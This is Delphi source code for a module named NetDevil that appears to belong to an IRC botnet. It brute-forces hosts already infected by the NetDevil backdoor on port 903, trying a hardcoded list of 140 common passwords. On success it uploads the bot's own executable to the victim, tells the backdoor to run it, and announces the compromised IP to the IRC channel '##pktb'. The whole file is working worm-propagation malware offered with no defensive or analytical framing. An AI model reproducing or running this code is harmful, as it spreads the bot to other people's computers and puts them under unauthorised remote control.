unit pNetDevil;

interface

uses
  Windows, Winsock, Bot;

Const
  Password: Array[0..139] Of String = (
        '',		'administrator',	'administrador','administrateur',	'administrat',
        'admins',	'admin',		'adm',		'password1',		'password',
        'passwd',	'pass1234',		'pass',		'pwd',			'007',
        '1',		'12',			'123',		'1234',			'12345',
        '123456',	'1234567',		'12345678',	'123456789',		'1234567890',
        '2000',		'2001',			'2002',		'2003',			'2004',
        'test',		'guest',		'none',		'demo',			'unix',
        'linux',	'changeme',		'default',	'system',		'server',
        'root',		'null',			'qwerty',	'mail',			'outlook',
        'web',		'www',			'internet',	'accounts',		'accounting',
        'home',		'homeuser',		'user',		'oem',			'oemuser',
        'oeminstall',	'windows',		'win98',	'win2k',		'winxp',
        'winnt',	'win2000',		'qaz',		'asd',			'zxc',
        'qwe',		'bob',			'jen',		'joe',			'fred',
        'bill',		'mike',			'john',		'peter',		'luke',
        'sam',		'sue',			'susan',	'peter',		'brian',
        'lee',		'neil',			'ian',		'chris',		'eric',
        'george',	'kate',			'bob',		'katie',		'mary',
        'login',	'loginpass',		'technical',	'backup',		'exchange',
        'fuck',		'bitch',		'slut',		'sex',			'god',
        'hell',		'hello',		'domain',	'domainpass',		'domainpassword',
        'database',	'access',		'dbpass',	'dbpassword',		'databasepass',
        'data',		'databasepassword',	'db1',		'db2',			'db1234',
        'sa',		'sql',			'sqlpass',	'oainstall',		'orainstall',
        'oracle',	'ibm',			'cisco',	'dell',			'compaq',
        'siemens',	'hp',			'nokia',	'xp',			'control',
        'office',	'blank',		'winpass',	'main',			'lan',
        'internet',	'intranet',		'student',	'teacher',		'staff');

Function NetDevil(IP: String): Bool;

implementation

function StrtoInt(const S: string): integer; var
E: integer; begin Val(S, Result, E); end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function NetDevil_Receive(Sock: TSocket): Integer;
Var
  TimeOut: TimeVal;
  Fd_Struct: TFDSet;
Begin
  TimeOut.tv_sec := 30;
  TimeOut.tv_usec := 0;

  FD_ZERO(FD_STRUCT);
  FD_SET(Sock, FD_STRUCT);

  If Select(0, @FD_STRUCT, NIL, NIL, @TIMEOUT) <= 0 Then
  Begin
    CloseSocket(Sock);
    Result := -1;
    Exit;
  End;
  Result := 0;
End;

Function NetDevil_Upload(IP: String; Sock: TSocket): Integer;
Var
  nSock: TSocket;
  Addr : TSockAddrIn;
  WSAData: TWSAData;
  Buffer: Array[0..1024]Of Char;
  BotFile: String;
  rFile: String;

  Port: Integer;
  Bytes_Sent: Integer;
  fSend: Integer;
  fSize: Integer;
  Mov: Integer;

  Mode: DWord;
  ver15: Bool;

  uPort: String;
  ver  : String;
  TestFile: THandle;
  Temp : String;
Label
  En;
Begin
  Result := -1;
  fSend := 1024;
  ver15 := False;
  Mode := 0;

  BotFile := ParamStr(0);

  Temp := 'version';
  Send(Sock, Temp[1], 7, 0);
  fillchar(Buffer, SizeOf(Buffer), #0);
  Recv(Sock, Buffer, SizeOf(Buffer), 0);

  If Length(Buffer) > 5 Then
  Begin
    Buffer[Length(Buffer)-2] := '0';
    uPort := Copy(String(Buffer), 1, Pos(#10#13, String(Buffer))-1);
    if uPort <> '' Then Port := hTons(StrToInt(uPort));
  End;

  Ver := Copy(String(Buffer), 1, Pos(#10#13, String(Buffer))-1);
  If String(Buffer) = 'ver1.5' Then Ver15 := True;
  rFile := 'C:\file.exe'; //+filename(?)

  If Port = 0 Then Port := 903;

  // Connection Part
  WsaStartUp(MakeWord(1,1), WSAData);
  nSock := Socket(AF_INET, 1, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(Port);
  Addr.sin_addr.S_addr := inet_addr(pchar(IP));
  If Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR Then Goto En;

  TestFile := CreateFile(pChar(BotFile), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
  If TestFile = INVALID_HANDLE_VALUE then goto en;

  FSize := GetFileSize(TestFile, NIL);

  If Ver15 Then
    Temp := 'cmd[003]'+rFile+'|'+IntToStr(fSize)+'|'+#10#13
  Else
    Temp := rFile+#13+'1';
  Send(nSock, Temp[1], Length(Temp), 0);
  If Recv(nSock, Buffer, SizeOf(Buffer), 0) < 1 Then Goto En;

  While FSize > 0 Do
  Begin
    FillChar(Buffer, SizeOf(Buffer), #0);
    If (FSend>FSize) Then FSend := FSize;
    Mov := 0-FSize;

    SetFilePointer(TestFile, Mov, NIL, FILE_END);
    ReadFile(TestFile, Buffer, FSend, Mode, NIL);
    Bytes_Sent := Send(nSock, Buffer, FSend, 0);
    If Bytes_Sent = SOCKET_ERROR Then
    Begin
      If WSAGetLastError <> WSAEWOULDBLOCK Then Goto En;
    End Else
      Bytes_Sent := 0;
    FSize := Fsize - Bytes_Sent;

    If (Not Ver15) and (Recv(nSock, Buffer, SizeOf(Buffer), 0) < 1) Then Goto En;
  End;

  If TestFile <> INVALID_HANDLE_VALUE Then CloseHandle(Testfile);
  CloseSocket(nSock);
  Sleep(2000);

  Temp := 'pleaz_run'+rFile;
  Send(Sock, Temp[1], Length(Temp), 0);
  FillChar(Buffer, SizeOf(Buffer), #0);
  If Recv(Sock, Buffer, SizeOf(Buffer), 0) < 1 Then Goto En;
  If String(Buffer) <> 'pleaz_run_done' Then Goto En;

  Sleep(4000);
  CloseSocket(Sock);

  Result := 1;
  WsaCleanUp;
  Exit;
En:
  CloseSocket( Sock);
  CloseSocket(nSock);
  WsaCleanUp;
End;

Function NetDevil(IP: String): Bool;
Var
  Buffer: Array[0..4000] Of Char;
  Mode  : Integer;
  Sock  : TSocket;
  Addr  : TSockAddrIn;
  I     : Integer;
  Temp  : String;
  Wsa   : TWSAData;
Begin
  Result := False;
  WSAStartUp(MakeWord(2,2), WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  If Sock = INVALID_SOCKET Then Exit;

  Addr.Sin_Family := AF_INET;
  Addr.Sin_Addr.S_addr := inet_Addr(pchar(ip));
  Addr.sin_port := hTons(903);

  Mode := 0;
  Connect(Sock, Addr, SizeOf(Addr));
  IOCTLSocket(Sock, FIONBIO, Mode);

  For I := 0 To 139 Do
  Begin
    Sleep(50);
    FillChar(Buffer, SizeOf(Buffer), #0);

    If NetDevil_Receive(Sock) = -1 Then
      Break;
    If Recv(Sock, Buffer, SizeOf(BuffeR), 0) <= 0 Then
      Break;
    If String(Buffer) = 'passed' Then
    Begin
      Temp := 'nd '+IP+' '+Password[i-1];
      Send(Sock, Temp[1], Length(Temp), 0);

      If NetDevil_Upload(IP, Sock) = 1 Then
      Begin
        CloseSocket(Sock);
        Result := True;
        SendData('PRIVMSG ##pktb :[NetDevil]Exploited '+IP+#10);
        Inc(NDevil);
      End;
      Break;
    End;
    If String(Buffer) = 'pass_pleaz' Then
    Begin
      Temp := 'pass_pleaz'+Password[i];
      Send(Sock, Temp[1], Length(Temp), 0);
      Continue;
    End Else Break;
  End;
  CloseSocket(Sock);
  WSACleanUp;
End;

end.
